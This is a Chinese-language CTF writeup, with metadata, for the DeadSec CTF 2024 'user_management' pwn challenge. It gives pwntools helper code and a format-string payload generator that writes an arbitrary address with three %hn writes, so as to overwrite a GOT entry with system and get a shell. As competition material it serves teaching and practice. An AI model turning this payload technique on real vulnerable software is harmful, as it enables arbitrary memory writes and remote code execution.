---
title: DeadSec CTF 2024 writeup by Mini-Venom
contest: DeadSec CTF 2024
year: 2024
difficulty: hard
vuln_type: fmt_string
tags: [pwn, user-management, fmt-string, three-write, libc-leak, privilege]
attack_chain:
  - 菜单 1=root_login/2=add_user/3=login/4=logout/5=vuln
  - root_login: manage users\x00\x00\x00\x00 / MrAlphaQ / \x00\x00\x00\x00\x00\x00\x00\x00
  - add_user: name/passwd='0rb1t'/desc
  - vuln: 触发格式化字符串
  - generate_fmt三段写入任意地址
  - %hn按2字节写3次→6字节全地址
  - 改GOT表为system触发getshell
key_payload: payload = b'%c'*14 + b'%'+str(d1-14)+b'c%hn' + ...  # 3段%hn
one_liner: DeadSec CTF 2024 user-management fmt-string三段写GOT表
lesson: %hn可按2字节写入，3次%hn覆盖6字节地址
quality: high
---

# DeadSec CTF 2024 writeup by Mini-Venom

## 题目信息
- 比赛：DeadSec CTF 2024
- 战队：Mini-Venom（ChaMd5）
- 题目：user_management（PWN）

## 关键攻击链
### 1. 菜单
```python
def root_login():
    p.sendlineafter(b'ce: ', str(1))
    p.sendlineafter(b'here?', b'manage usersaaaax00')
    p.sendlineafter(b'ame: ', b'MrAlphaQ')
    p.sendlineafter(b'rd: ', b'x00')

def add_user(desc, name, passwd=b'0rb1t'):
    p.sendlineafter(b'ce: ', str(2))
    p.sendlineafter(b'ame: ', name)
    p.sendlineafter(b'rd: ', passwd)
    p.sendlineafter(b'ion: ', desc)

def login(name, passwd=b'0rb1t'):
    p.sendlineafter(b'ce: ', str(3))
    p.sendlineafter(b'ame: ', name)
    p.sendlineafter(b'rd: ', passwd)

def logout():
    p.sendlineafter(b'ce: ', str(4))

def vuln():
    p.sendlineafter(b'ce: ', str(5))
```

### 2. 格式化字符串利用
```python
def generate_fmt(addr, value):
    d1 = value % 0x10000
    d2 = value // 0x10000 % 0x10000
    d3 = value // 0x10000 // 0x10000 % 0x10000
    dct = sorted([(0, d1), (1, d2), (2, d3)], key=lambda x: x[1])
    payload = b'%c'*14 + b'%'+str(dct[0][1]-14).encode() + b'c%hn'
    payload += b'%'+str(dct[1][1]-dct[0][1]).encode() + b'c%hn'
    payload += b'%'+str(dct[2][1]-dct[1][1]).encode() + b'c%hn'
    payload = payload.ljust((16-6)*8, b'a')
    payload += p64(addr+dct[0][0]*2) + p64(0)
    payload += p64(addr+dct[1][0]*2) + p64(0)
    payload += p64(addr+dct[2][0]*2) + p64(0)
```
- 关键 trick：3 次 `%hn` 按 2 字节写入，覆盖 6 字节地址
- 排序 d1/d2/d3，从小到大依次写入
- addr+offset*2 控制写入位置

## 评分
- quality: high（3 段 %hn 写入任意地址 + 完整 pwn 框架）
